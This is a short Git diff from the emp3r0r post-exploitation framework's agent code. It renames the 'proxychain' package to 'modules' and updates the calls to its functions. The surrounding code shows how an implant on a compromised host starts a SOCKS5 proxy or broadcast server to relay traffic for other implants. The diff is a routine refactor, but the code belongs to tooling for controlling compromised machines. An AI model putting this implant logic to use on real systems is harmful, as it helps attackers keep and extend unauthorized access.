@@ -19,7 +19,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/handler"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/proxychain"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
@@ -237,7 +237,7 @@ test_agent:
 			if *cnt == 0 {
 				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
 				ctx, cancel := context.WithCancel(context.Background())
-				go proxychain.StartBroadcast(true, ctx, cancel) // auto-proxy feature
+				go modules.StartBroadcast(true, ctx, cancel) // auto-proxy feature
 			}
 			return true
 
@@ -249,7 +249,7 @@ test_agent:
 				go func() {
 					ctx, cancel := context.WithCancel(context.Background())
 					log.Printf("[%d] Starting broadcast server to receive proxy", *cnt)
-					err := proxychain.BroadcastServer(ctx, cancel, "")
+					err := modules.BroadcastServer(ctx, cancel, "")
 					if err != nil {
 						log.Fatalf("BroadcastServer: %v", err)
 					}
